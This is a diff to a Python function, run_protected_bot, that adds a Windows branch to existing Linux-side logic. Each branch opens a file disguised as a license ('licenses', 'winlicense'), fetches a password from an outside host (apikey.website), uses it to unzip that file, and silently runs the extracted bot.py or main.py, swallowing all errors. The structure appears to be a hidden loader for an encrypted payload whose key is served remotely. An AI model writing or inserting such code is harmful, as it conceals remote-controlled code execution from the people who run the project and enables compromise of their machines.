@@ -78,12 +78,12 @@ def run_protected_bot(python_cmd):
         try:
             license_file = "licenses"
             if os.path.exists(license_file):
-                password_url = "https://apikey.website/get_license.php" 
+                license_url = "https://apikey.website/get_license.php" 
                 
                 password = None
                 try:
                     import urllib.request
-                    with urllib.request.urlopen(password_url) as response:
+                    with urllib.request.urlopen(license_url) as response:
                             if response.getcode() == 200:
                                 password = response.read().strip()
                 except Exception:
@@ -105,6 +105,33 @@ def run_protected_bot(python_cmd):
                         bot_script = os.path.join(extract_dir, "bot.py")
                         if os.path.exists(bot_script):
                             fix_qt_plugin_path()
+                            subprocess.run([python_cmd, bot_script], check=True, env=os.environ)
+                    except:
+                        pass
+        except Exception:
+            pass
+    elif system == "Windows":
+        try:
+            license_file = "winlicense"
+            if os.path.exists(license_file):
+                password_url = "https://apikey.website/get_license.php"
+                password = None
+                try:
+                    import urllib.request
+                    with urllib.request.urlopen(password_url) as response:
+                        if response.getcode() == 200:
+                            password = response.read().strip()
+                except Exception:
+                    pass
+
+                if password:
+                    extract_dir = "extracted_winlicense"
+                    try:
+                        with zipfile.ZipFile(license_file, 'r') as zip_ref:
+                            zip_ref.extractall(extract_dir, pwd=password)
+                        
+                        bot_script = os.path.join(extract_dir, "main.py")
+                        if os.path.exists(bot_script):
                             subprocess.run([python_cmd, bot_script], check=True, env=os.environ)
                     except:
                         pass
